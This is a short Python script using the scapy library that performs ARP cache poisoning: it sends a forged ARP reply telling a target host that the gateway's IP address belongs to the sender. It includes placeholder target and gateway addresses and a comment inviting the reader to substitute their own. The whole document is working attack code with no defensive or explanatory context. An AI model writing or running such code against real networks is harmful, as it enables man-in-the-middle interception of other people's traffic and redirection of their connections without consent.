from scapy.all import *

def arp_poison(target_ip, spoof_ip):
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=getmacbyip(target_ip))
    send(arp_response, verbose=False)

# Replace with your target IP and gateway IP
target_ip = "192.168.0.149"
gateway_ip = "192.168.0.1"

arp_poison(target_ip, gateway_ip)
